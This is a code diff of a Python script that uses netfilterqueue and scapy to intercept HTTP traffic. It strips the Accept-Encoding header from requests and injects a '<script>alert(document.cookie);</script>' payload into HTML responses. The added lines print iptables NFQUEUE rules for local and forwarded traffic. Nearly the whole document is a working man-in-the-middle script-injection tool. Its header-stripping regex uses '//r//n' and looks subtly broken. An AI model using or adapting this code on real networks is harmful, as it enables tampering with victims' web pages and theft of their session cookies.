@@ -4,6 +4,14 @@ import netfilterqueue
 import scapy.all as scapy
 import re
 
+print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+print("[*] For Local Use, configure the iptables as well:")
+print("\t[-] iptables -I INPUT -j NFQUEUE --queue-num 0")
+print("\t[-] iptables -I OUTPUT -j NFQUEUE --queue-num 0")
+print("[*] For Network Use, configure the iptables as well:")
+print("\t[-] iptables -I FORWARD -j NFQUEUE --queue-num 0")
+print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+
 injected_payload = "<script>alert(document.cookie);</script></body>"
 
 def set_load(packet, load):
@@ -17,17 +25,20 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
-            modified_load = re.sub("Accept-Encoding:.*?//r//n", "", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+            load = re.sub("Accept-Encoding:.*?//r//n", "", load)
+            
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", injected_payload)
-            new_packet = set_load(scapy_packet, modified_load)
+            load = load.replace("</body>", injected_payload)
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
             packet.set_payload(str(new_packet))
+            
 
     packet.accept()
 
